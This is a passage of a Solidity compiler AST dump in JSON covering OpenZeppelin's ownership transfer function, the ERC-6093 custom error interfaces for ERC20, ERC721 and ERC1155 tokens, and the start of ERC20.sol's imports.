ide":{"id":137,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":129,"src":"3029:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"src":"3020:17:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"id":139,"nodeType":"ExpressionStatement","src":"3020:17:0"},{"eventCall":{"arguments":[{"id":141,"name":"oldOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":133,"src":"3073:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},{"id":142,"name":"newOwner","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":129,"src":"3083:8:0","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}}],"expression":{"argumentTypes":[{"typeIdentifier":"t_address","typeString":"address"},{"typeIdentifier":"t_address","typeString":"address"}],"id":140,"name":"OwnershipTransferred","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":24,"src":"3052:20:0","typeDescriptions":{"typeIdentifier":"t_function_event_nonpayable$_t_address_$_t_address_$returns$__$","typeString":"function (address,address)"}},"id":143,"isConstant":false,"isLValue":false,"isPure":false,"kind":"functionCall","lValueRequested":false,"nameLocations":[],"names":[],"nodeType":"FunctionCall","src":"3052:40:0","tryCall":false,"typeDescriptions":{"typeIdentifier":"t_tuple$__$","typeString":"tuple()"}},"id":144,"nodeType":"EmitStatement","src":"3047:45:0"}]},"documentation":{"id":127,"nodeType":"StructuredDocumentation","src":"2764:143:0","text":" @dev Transfers ownership of the contract to a new account (`newOwner`).\n Internal function without access restriction."},"id":146,"implemented":true,"kind":"function","modifiers":[],"name":"_transferOwnership","nameLocation":"2921:18:0","nodeType":"FunctionDefinition","parameters":{"id":130,"nodeType":"ParameterList","parameters":[{"constant":false,"id":129,"mutability":"mutable","name":"newOwner","nameLocation":"2948:8:0","nodeType":"VariableDeclaration","scope":146,"src":"2940:16:0","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":128,"name":"address","nodeType":"ElementaryTypeName","src":"2940:7:0","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2939:18:0"},"returnParameters":{"id":131,"nodeType":"ParameterList","parameters":[],"src":"2975:0:0"},"scope":147,"src":"2912:187:0","stateMutability":"nonpayable","virtual":true,"visibility":"internal"}],"scope":148,"src":"663:2438:0","usedErrors":[13,18],"usedEvents":[24]}],"src":"102:3000:0"},"id":0},"@openzeppelin/contracts/interfaces/draft-IERC6093.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/interfaces/draft-IERC6093.sol","exportedSymbols":{"IERC1155Errors":[284],"IERC20Errors":[189],"IERC721Errors":[237]},"id":285,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":149,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"112:24:1"},{"abstract":false,"baseContracts":[],"canonicalName":"IERC20Errors","contractDependencies":[],"contractKind":"interface","documentation":{"id":150,"nodeType":"StructuredDocumentation","src":"138:139:1","text":" @dev Standard ERC20 Errors\n Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC20 tokens."},"fullyImplemented":true,"id":189,"linearizedBaseContracts":[189],"name":"IERC20Errors","nameLocation":"288:12:1","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":151,"nodeType":"StructuredDocumentation","src":"307:309:1","text":" @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n @param sender Address whose tokens are being transferred.\n @param balance Current balance for the interacting account.\n @param needed Minimum amount required to perform a transfer."},"errorSelector":"e450d38c","id":159,"name":"ERC20InsufficientBalance","nameLocation":"627:24:1","nodeType":"ErrorDefinition","parameters":{"id":158,"nodeType":"ParameterList","parameters":[{"constant":false,"id":153,"mutability":"mutable","name":"sender","nameLocation":"660:6:1","nodeType":"VariableDeclaration","scope":159,"src":"652:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":152,"name":"address","nodeType":"ElementaryTypeName","src":"652:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":155,"mutability":"mutable","name":"balance","nameLocation":"676:7:1","nodeType":"VariableDeclaration","scope":159,"src":"668:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":154,"name":"uint256","nodeType":"ElementaryTypeName","src":"668:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":157,"mutability":"mutable","name":"needed","nameLocation":"693:6:1","nodeType":"VariableDeclaration","scope":159,"src":"685:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":156,"name":"uint256","nodeType":"ElementaryTypeName","src":"685:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"651:49:1"},"src":"621:80:1"},{"documentation":{"id":160,"nodeType":"StructuredDocumentation","src":"707:152:1","text":" @dev Indicates a failure with the token `sender`. Used in transfers.\n @param sender Address whose tokens are being transferred."},"errorSelector":"96c6fd1e","id":164,"name":"ERC20InvalidSender","nameLocation":"870:18:1","nodeType":"ErrorDefinition","parameters":{"id":163,"nodeType":"ParameterList","parameters":[{"constant":false,"id":162,"mutability":"mutable","name":"sender","nameLocation":"897:6:1","nodeType":"VariableDeclaration","scope":164,"src":"889:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":161,"name":"address","nodeType":"ElementaryTypeName","src":"889:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"888:16:1"},"src":"864:41:1"},{"documentation":{"id":165,"nodeType":"StructuredDocumentation","src":"911:159:1","text":" @dev Indicates a failure with the token `receiver`. Used in transfers.\n @param receiver Address to which tokens are being transferred."},"errorSelector":"ec442f05","id":169,"name":"ERC20InvalidReceiver","nameLocation":"1081:20:1","nodeType":"ErrorDefinition","parameters":{"id":168,"nodeType":"ParameterList","parameters":[{"constant":false,"id":167,"mutability":"mutable","name":"receiver","nameLocation":"1110:8:1","nodeType":"VariableDeclaration","scope":169,"src":"1102:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":166,"name":"address","nodeType":"ElementaryTypeName","src":"1102:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1101:18:1"},"src":"1075:45:1"},{"documentation":{"id":170,"nodeType":"StructuredDocumentation","src":"1126:345:1","text":" @dev Indicates a failure with the `spender`’s `allowance`. Used in transfers.\n @param spender Address that may be allowed to operate on tokens without being their owner.\n @param allowance Amount of tokens a `spender` is allowed to operate with.\n @param needed Minimum amount required to perform a transfer."},"errorSelector":"fb8f41b2","id":178,"name":"ERC20InsufficientAllowance","nameLocation":"1482:26:1","nodeType":"ErrorDefinition","parameters":{"id":177,"nodeType":"ParameterList","parameters":[{"constant":false,"id":172,"mutability":"mutable","name":"spender","nameLocation":"1517:7:1","nodeType":"VariableDeclaration","scope":178,"src":"1509:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":171,"name":"address","nodeType":"ElementaryTypeName","src":"1509:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":174,"mutability":"mutable","name":"allowance","nameLocation":"1534:9:1","nodeType":"VariableDeclaration","scope":178,"src":"1526:17:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":173,"name":"uint256","nodeType":"ElementaryTypeName","src":"1526:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":176,"mutability":"mutable","name":"needed","nameLocation":"1553:6:1","nodeType":"VariableDeclaration","scope":178,"src":"1545:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":175,"name":"uint256","nodeType":"ElementaryTypeName","src":"1545:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"1508:52:1"},"src":"1476:85:1"},{"documentation":{"id":179,"nodeType":"StructuredDocumentation","src":"1567:174:1","text":" @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n @param approver Address initiating an approval operation."},"errorSelector":"e602df05","id":183,"name":"ERC20InvalidApprover","nameLocation":"1752:20:1","nodeType":"ErrorDefinition","parameters":{"id":182,"nodeType":"ParameterList","parameters":[{"constant":false,"id":181,"mutability":"mutable","name":"approver","nameLocation":"1781:8:1","nodeType":"VariableDeclaration","scope":183,"src":"1773:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":180,"name":"address","nodeType":"ElementaryTypeName","src":"1773:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"1772:18:1"},"src":"1746:45:1"},{"documentation":{"id":184,"nodeType":"StructuredDocumentation","src":"1797:195:1","text":" @dev Indicates a failure with the `spender` to be approved. Used in approvals.\n @param spender Address that may be allowed to operate on tokens without being their owner."},"errorSelector":"94280d62","id":188,"name":"ERC20InvalidSpender","nameLocation":"2003:19:1","nodeType":"ErrorDefinition","parameters":{"id":187,"nodeType":"ParameterList","parameters":[{"constant":false,"id":186,"mutability":"mutable","name":"spender","nameLocation":"2031:7:1","nodeType":"VariableDeclaration","scope":188,"src":"2023:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":185,"name":"address","nodeType":"ElementaryTypeName","src":"2023:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2022:17:1"},"src":"1997:43:1"}],"scope":285,"src":"278:1764:1","usedErrors":[159,164,169,178,183,188],"usedEvents":[]},{"abstract":false,"baseContracts":[],"canonicalName":"IERC721Errors","contractDependencies":[],"contractKind":"interface","documentation":{"id":190,"nodeType":"StructuredDocumentation","src":"2044:141:1","text":" @dev Standard ERC721 Errors\n Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC721 tokens."},"fullyImplemented":true,"id":237,"linearizedBaseContracts":[237],"name":"IERC721Errors","nameLocation":"2196:13:1","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":191,"nodeType":"StructuredDocumentation","src":"2216:219:1","text":" @dev Indicates that an address can't be an owner. For example, `address(0)` is a forbidden owner in EIP-20.\n Used in balance queries.\n @param owner Address of the current owner of a token."},"errorSelector":"89c62b64","id":195,"name":"ERC721InvalidOwner","nameLocation":"2446:18:1","nodeType":"ErrorDefinition","parameters":{"id":194,"nodeType":"ParameterList","parameters":[{"constant":false,"id":193,"mutability":"mutable","name":"owner","nameLocation":"2473:5:1","nodeType":"VariableDeclaration","scope":195,"src":"2465:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":192,"name":"address","nodeType":"ElementaryTypeName","src":"2465:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2464:15:1"},"src":"2440:40:1"},{"documentation":{"id":196,"nodeType":"StructuredDocumentation","src":"2486:132:1","text":" @dev Indicates a `tokenId` whose `owner` is the zero address.\n @param tokenId Identifier number of a token."},"errorSelector":"7e273289","id":200,"name":"ERC721NonexistentToken","nameLocation":"2629:22:1","nodeType":"ErrorDefinition","parameters":{"id":199,"nodeType":"ParameterList","parameters":[{"constant":false,"id":198,"mutability":"mutable","name":"tokenId","nameLocation":"2660:7:1","nodeType":"VariableDeclaration","scope":200,"src":"2652:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":197,"name":"uint256","nodeType":"ElementaryTypeName","src":"2652:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"2651:17:1"},"src":"2623:46:1"},{"documentation":{"id":201,"nodeType":"StructuredDocumentation","src":"2675:289:1","text":" @dev Indicates an error related to the ownership over a particular token. Used in transfers.\n @param sender Address whose tokens are being transferred.\n @param tokenId Identifier number of a token.\n @param owner Address of the current owner of a token."},"errorSelector":"64283d7b","id":209,"name":"ERC721IncorrectOwner","nameLocation":"2975:20:1","nodeType":"ErrorDefinition","parameters":{"id":208,"nodeType":"ParameterList","parameters":[{"constant":false,"id":203,"mutability":"mutable","name":"sender","nameLocation":"3004:6:1","nodeType":"VariableDeclaration","scope":209,"src":"2996:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":202,"name":"address","nodeType":"ElementaryTypeName","src":"2996:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":205,"mutability":"mutable","name":"tokenId","nameLocation":"3020:7:1","nodeType":"VariableDeclaration","scope":209,"src":"3012:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":204,"name":"uint256","nodeType":"ElementaryTypeName","src":"3012:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":207,"mutability":"mutable","name":"owner","nameLocation":"3037:5:1","nodeType":"VariableDeclaration","scope":209,"src":"3029:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":206,"name":"address","nodeType":"ElementaryTypeName","src":"3029:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"2995:48:1"},"src":"2969:75:1"},{"documentation":{"id":210,"nodeType":"StructuredDocumentation","src":"3050:152:1","text":" @dev Indicates a failure with the token `sender`. Used in transfers.\n @param sender Address whose tokens are being transferred."},"errorSelector":"73c6ac6e","id":214,"name":"ERC721InvalidSender","nameLocation":"3213:19:1","nodeType":"ErrorDefinition","parameters":{"id":213,"nodeType":"ParameterList","parameters":[{"constant":false,"id":212,"mutability":"mutable","name":"sender","nameLocation":"3241:6:1","nodeType":"VariableDeclaration","scope":214,"src":"3233:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":211,"name":"address","nodeType":"ElementaryTypeName","src":"3233:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"3232:16:1"},"src":"3207:42:1"},{"documentation":{"id":215,"nodeType":"StructuredDocumentation","src":"3255:159:1","text":" @dev Indicates a failure with the token `receiver`. Used in transfers.\n @param receiver Address to which tokens are being transferred."},"errorSelector":"64a0ae92","id":219,"name":"ERC721InvalidReceiver","nameLocation":"3425:21:1","nodeType":"ErrorDefinition","parameters":{"id":218,"nodeType":"ParameterList","parameters":[{"constant":false,"id":217,"mutability":"mutable","name":"receiver","nameLocation":"3455:8:1","nodeType":"VariableDeclaration","scope":219,"src":"3447:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":216,"name":"address","nodeType":"ElementaryTypeName","src":"3447:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"3446:18:1"},"src":"3419:46:1"},{"documentation":{"id":220,"nodeType":"StructuredDocumentation","src":"3471:247:1","text":" @dev Indicates a failure with the `operator`’s approval. Used in transfers.\n @param operator Address that may be allowed to operate on tokens without being their owner.\n @param tokenId Identifier number of a token."},"errorSelector":"177e802f","id":226,"name":"ERC721InsufficientApproval","nameLocation":"3729:26:1","nodeType":"ErrorDefinition","parameters":{"id":225,"nodeType":"ParameterList","parameters":[{"constant":false,"id":222,"mutability":"mutable","name":"operator","nameLocation":"3764:8:1","nodeType":"VariableDeclaration","scope":226,"src":"3756:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":221,"name":"address","nodeType":"ElementaryTypeName","src":"3756:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":224,"mutability":"mutable","name":"tokenId","nameLocation":"3782:7:1","nodeType":"VariableDeclaration","scope":226,"src":"3774:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":223,"name":"uint256","nodeType":"ElementaryTypeName","src":"3774:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"3755:35:1"},"src":"3723:68:1"},{"documentation":{"id":227,"nodeType":"StructuredDocumentation","src":"3797:174:1","text":" @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n @param approver Address initiating an approval operation."},"errorSelector":"a9fbf51f","id":231,"name":"ERC721InvalidApprover","nameLocation":"3982:21:1","nodeType":"ErrorDefinition","parameters":{"id":230,"nodeType":"ParameterList","parameters":[{"constant":false,"id":229,"mutability":"mutable","name":"approver","nameLocation":"4012:8:1","nodeType":"VariableDeclaration","scope":231,"src":"4004:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":228,"name":"address","nodeType":"ElementaryTypeName","src":"4004:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4003:18:1"},"src":"3976:46:1"},{"documentation":{"id":232,"nodeType":"StructuredDocumentation","src":"4028:197:1","text":" @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n @param operator Address that may be allowed to operate on tokens without being their owner."},"errorSelector":"5b08ba18","id":236,"name":"ERC721InvalidOperator","nameLocation":"4236:21:1","nodeType":"ErrorDefinition","parameters":{"id":235,"nodeType":"ParameterList","parameters":[{"constant":false,"id":234,"mutability":"mutable","name":"operator","nameLocation":"4266:8:1","nodeType":"VariableDeclaration","scope":236,"src":"4258:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":233,"name":"address","nodeType":"ElementaryTypeName","src":"4258:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"4257:18:1"},"src":"4230:46:1"}],"scope":285,"src":"2186:2092:1","usedErrors":[195,200,209,214,219,226,231,236],"usedEvents":[]},{"abstract":false,"baseContracts":[],"canonicalName":"IERC1155Errors","contractDependencies":[],"contractKind":"interface","documentation":{"id":238,"nodeType":"StructuredDocumentation","src":"4280:143:1","text":" @dev Standard ERC1155 Errors\n Interface of the https://eips.ethereum.org/EIPS/eip-6093[ERC-6093] custom errors for ERC1155 tokens."},"fullyImplemented":true,"id":284,"linearizedBaseContracts":[284],"name":"IERC1155Errors","nameLocation":"4434:14:1","nodeType":"ContractDefinition","nodes":[{"documentation":{"id":239,"nodeType":"StructuredDocumentation","src":"4455:361:1","text":" @dev Indicates an error related to the current `balance` of a `sender`. Used in transfers.\n @param sender Address whose tokens are being transferred.\n @param balance Current balance for the interacting account.\n @param needed Minimum amount required to perform a transfer.\n @param tokenId Identifier number of a token."},"errorSelector":"03dee4c5","id":249,"name":"ERC1155InsufficientBalance","nameLocation":"4827:26:1","nodeType":"ErrorDefinition","parameters":{"id":248,"nodeType":"ParameterList","parameters":[{"constant":false,"id":241,"mutability":"mutable","name":"sender","nameLocation":"4862:6:1","nodeType":"VariableDeclaration","scope":249,"src":"4854:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":240,"name":"address","nodeType":"ElementaryTypeName","src":"4854:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":243,"mutability":"mutable","name":"balance","nameLocation":"4878:7:1","nodeType":"VariableDeclaration","scope":249,"src":"4870:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":242,"name":"uint256","nodeType":"ElementaryTypeName","src":"4870:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":245,"mutability":"mutable","name":"needed","nameLocation":"4895:6:1","nodeType":"VariableDeclaration","scope":249,"src":"4887:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":244,"name":"uint256","nodeType":"ElementaryTypeName","src":"4887:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":247,"mutability":"mutable","name":"tokenId","nameLocation":"4911:7:1","nodeType":"VariableDeclaration","scope":249,"src":"4903:15:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":246,"name":"uint256","nodeType":"ElementaryTypeName","src":"4903:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"4853:66:1"},"src":"4821:99:1"},{"documentation":{"id":250,"nodeType":"StructuredDocumentation","src":"4926:152:1","text":" @dev Indicates a failure with the token `sender`. Used in transfers.\n @param sender Address whose tokens are being transferred."},"errorSelector":"01a83514","id":254,"name":"ERC1155InvalidSender","nameLocation":"5089:20:1","nodeType":"ErrorDefinition","parameters":{"id":253,"nodeType":"ParameterList","parameters":[{"constant":false,"id":252,"mutability":"mutable","name":"sender","nameLocation":"5118:6:1","nodeType":"VariableDeclaration","scope":254,"src":"5110:14:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":251,"name":"address","nodeType":"ElementaryTypeName","src":"5110:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"5109:16:1"},"src":"5083:43:1"},{"documentation":{"id":255,"nodeType":"StructuredDocumentation","src":"5132:159:1","text":" @dev Indicates a failure with the token `receiver`. Used in transfers.\n @param receiver Address to which tokens are being transferred."},"errorSelector":"57f447ce","id":259,"name":"ERC1155InvalidReceiver","nameLocation":"5302:22:1","nodeType":"ErrorDefinition","parameters":{"id":258,"nodeType":"ParameterList","parameters":[{"constant":false,"id":257,"mutability":"mutable","name":"receiver","nameLocation":"5333:8:1","nodeType":"VariableDeclaration","scope":259,"src":"5325:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":256,"name":"address","nodeType":"ElementaryTypeName","src":"5325:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"5324:18:1"},"src":"5296:47:1"},{"documentation":{"id":260,"nodeType":"StructuredDocumentation","src":"5349:256:1","text":" @dev Indicates a failure with the `operator`’s approval. Used in transfers.\n @param operator Address that may be allowed to operate on tokens without being their owner.\n @param owner Address of the current owner of a token."},"errorSelector":"e237d922","id":266,"name":"ERC1155MissingApprovalForAll","nameLocation":"5616:28:1","nodeType":"ErrorDefinition","parameters":{"id":265,"nodeType":"ParameterList","parameters":[{"constant":false,"id":262,"mutability":"mutable","name":"operator","nameLocation":"5653:8:1","nodeType":"VariableDeclaration","scope":266,"src":"5645:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":261,"name":"address","nodeType":"ElementaryTypeName","src":"5645:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"},{"constant":false,"id":264,"mutability":"mutable","name":"owner","nameLocation":"5671:5:1","nodeType":"VariableDeclaration","scope":266,"src":"5663:13:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":263,"name":"address","nodeType":"ElementaryTypeName","src":"5663:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"5644:33:1"},"src":"5610:68:1"},{"documentation":{"id":267,"nodeType":"StructuredDocumentation","src":"5684:174:1","text":" @dev Indicates a failure with the `approver` of a token to be approved. Used in approvals.\n @param approver Address initiating an approval operation."},"errorSelector":"3e31884e","id":271,"name":"ERC1155InvalidApprover","nameLocation":"5869:22:1","nodeType":"ErrorDefinition","parameters":{"id":270,"nodeType":"ParameterList","parameters":[{"constant":false,"id":269,"mutability":"mutable","name":"approver","nameLocation":"5900:8:1","nodeType":"VariableDeclaration","scope":271,"src":"5892:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":268,"name":"address","nodeType":"ElementaryTypeName","src":"5892:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"5891:18:1"},"src":"5863:47:1"},{"documentation":{"id":272,"nodeType":"StructuredDocumentation","src":"5916:197:1","text":" @dev Indicates a failure with the `operator` to be approved. Used in approvals.\n @param operator Address that may be allowed to operate on tokens without being their owner."},"errorSelector":"ced3e100","id":276,"name":"ERC1155InvalidOperator","nameLocation":"6124:22:1","nodeType":"ErrorDefinition","parameters":{"id":275,"nodeType":"ParameterList","parameters":[{"constant":false,"id":274,"mutability":"mutable","name":"operator","nameLocation":"6155:8:1","nodeType":"VariableDeclaration","scope":276,"src":"6147:16:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"},"typeName":{"id":273,"name":"address","nodeType":"ElementaryTypeName","src":"6147:7:1","stateMutability":"nonpayable","typeDescriptions":{"typeIdentifier":"t_address","typeString":"address"}},"visibility":"internal"}],"src":"6146:18:1"},"src":"6118:47:1"},{"documentation":{"id":277,"nodeType":"StructuredDocumentation","src":"6171:280:1","text":" @dev Indicates an array length mismatch between ids and values in a safeBatchTransferFrom operation.\n Used in batch transfers.\n @param idsLength Length of the array of token identifiers\n @param valuesLength Length of the array of token amounts"},"errorSelector":"5b059991","id":283,"name":"ERC1155InvalidArrayLength","nameLocation":"6462:25:1","nodeType":"ErrorDefinition","parameters":{"id":282,"nodeType":"ParameterList","parameters":[{"constant":false,"id":279,"mutability":"mutable","name":"idsLength","nameLocation":"6496:9:1","nodeType":"VariableDeclaration","scope":283,"src":"6488:17:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":278,"name":"uint256","nodeType":"ElementaryTypeName","src":"6488:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"},{"constant":false,"id":281,"mutability":"mutable","name":"valuesLength","nameLocation":"6515:12:1","nodeType":"VariableDeclaration","scope":283,"src":"6507:20:1","stateVariable":false,"storageLocation":"default","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"},"typeName":{"id":280,"name":"uint256","nodeType":"ElementaryTypeName","src":"6507:7:1","typeDescriptions":{"typeIdentifier":"t_uint256","typeString":"uint256"}},"visibility":"internal"}],"src":"6487:41:1"},"src":"6456:73:1"}],"scope":285,"src":"4424:2107:1","usedErrors":[249,254,259,266,271,276,283],"usedEvents":[]}],"src":"112:6420:1"},"id":1},"@openzeppelin/contracts/token/ERC20/ERC20.sol":{"ast":{"absolutePath":"@openzeppelin/contracts/token/ERC20/ERC20.sol","exportedSymbols":{"Context":[925],"ERC20":[799],"IERC20":[877],"IERC20Errors":[189],"IERC20Metadata":[903]},"id":800,"license":"MIT","nodeType":"SourceUnit","nodes":[{"id":286,"literals":["solidity","^","0.8",".20"],"nodeType":"PragmaDirective","src":"105:24:2"},{"absolutePath":"@openzeppelin/contracts/token/ERC20/IERC20.sol","file":"./IERC20.sol","id":288,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":800,"sourceUnit":878,"src":"131:36:2","symbolAliases":[{"foreign":{"id":287,"name":"IERC20","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":877,"src":"139:6:2","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol","file":"./extensions/IERC20Metadata.sol","id":290,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":800,"sourceUnit":904,"src":"168:63:2","symbolAliases":[{"foreign":{"id":289,"name":"IERC20Metadata","nodeType":"Identifier","overloadedDeclarations":[],"referencedDeclaration":903,"src":"176:14:2","typeDescriptions":{}},"nameLocation":"-1:-1:-1"}],"unitAlias":""},{"absolutePath":"@openzeppelin/contracts/utils/Context.sol","file":"../../utils/Context.sol","id":292,"nameLocation":"-1:-1:-1","nodeType":"ImportDirective","scope":800,"sourceUnit":9